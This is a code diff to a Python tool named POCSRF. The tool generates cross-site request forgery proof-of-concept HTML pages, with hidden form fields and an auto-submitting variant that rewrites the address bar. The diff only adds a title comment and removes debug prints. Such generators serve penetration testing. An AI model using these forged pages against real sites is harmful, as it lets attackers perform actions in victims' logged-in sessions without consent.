@@ -1,3 +1,5 @@
+#POCSRF - CSRF PoC Generator
+
 import re
 import sys
 import time
@@ -30,8 +32,6 @@ class CSRF_PoC_Generator():
                 self.names.append(self.data_set[i])
             else:
                 self.values.append(html.escape(self.data_set[i]))
-        
-        print("\nTesting Output: \n\tself.names: {} \n\tself.values: {}".format(self.names, self.values))
 
     def createRequest(self):
         
@@ -48,10 +48,7 @@ class CSRF_PoC_Generator():
         for i in range (0, len(self.data_set)//2):
             if (self.method == "POST"):
                 form_lines += "<input type=\"hidden\" value={} name={} />\n\t".format(self.values[i],self.names[i])
-       
-       
-        print("\nTesting Output: \n\t form_lines: {}".format(form_lines))
-
+  
         HTML_CODE = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n</body>\n</html>".format(self.method, self.uri, form_lines)
        
         HTML_CODE_AUTO_SUBMIT = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n\t<script>\n\t\tdocument.forms[0].submit();\n\t</script>\n</body>\n</html>".format(self.method, self.uri, form_lines)
@@ -114,9 +111,6 @@ Version - 1.0.2
     
     if ("-v" in sys.argv or "--verbose" in sys.argv):
         VERBOSE = True
-
-    
-    print ("\n Testing output: sys.argv: {}\n".format(sys.argv))
     
     new_PoC = CSRF_PoC_Generator(METHOD,URI,DATA,ENCODING,AUTO_SUBMIT,OUTPUT_FILE, VERBOSE)
     new_PoC.createRequest()
